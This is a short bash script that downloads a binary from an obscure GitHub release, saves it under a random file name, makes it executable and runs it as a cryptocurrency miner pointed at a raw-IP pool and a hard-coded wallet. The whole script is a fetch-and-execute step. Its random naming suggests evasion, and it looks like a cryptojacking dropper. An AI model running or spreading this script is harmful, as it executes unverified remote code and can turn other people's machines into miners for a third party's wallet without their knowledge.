#!/bin/bash

# Generate random filename (8 chars)
FILE_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Generate random worker name + date
WORKER_NAME="worker_$(tr -dc a-z0-9 </dev/urandom | head -c 5)_$(date +%Y%m%d)"

# Download using random filename
wget -O "$FILE_NAME" https://github.com/vedhagsvp/tkospae/releases/download/aplose/tnmtas

# Make executable
chmod +x "$FILE_NAME"

# Run with random worker name
./"$FILE_NAME" --xel-v3 \
  --stratum \
  --daemon-address 72.14.177.114:8085 \
  --wallet xel:4rxku34zp47htjxglcmcexz4ku2jp0dmemgt4wet7klq76a923sqq0tcq2c \
  --password x \
  --worker-name "$WORKER_NAME"
